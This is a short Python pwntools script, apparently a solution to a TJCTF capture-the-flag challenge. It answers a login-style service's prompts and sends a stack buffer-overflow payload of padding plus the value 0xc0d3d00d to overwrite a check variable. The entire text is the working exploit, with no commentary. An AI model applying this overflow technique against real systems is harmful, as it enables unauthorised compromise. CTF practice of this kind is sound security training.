from pwn import *

p = remote('p1.tjctf.org', 8002)

print p.recvline()

print p.recvuntil('Name: ')
p.sendline('aaaa')
print p.recvuntil('Username: ')
p.sendline('bbbb')
print p.recvuntil('Password: ')
p.sendline('cccc')

payload = ''
payload += 'a'*0x74
payload += p32(0xc0d3d00d)
print p.recvuntil('Tinder Bio: ')
p.sendline(payload)

sleep(4)
print p.recv()

p.interactive()
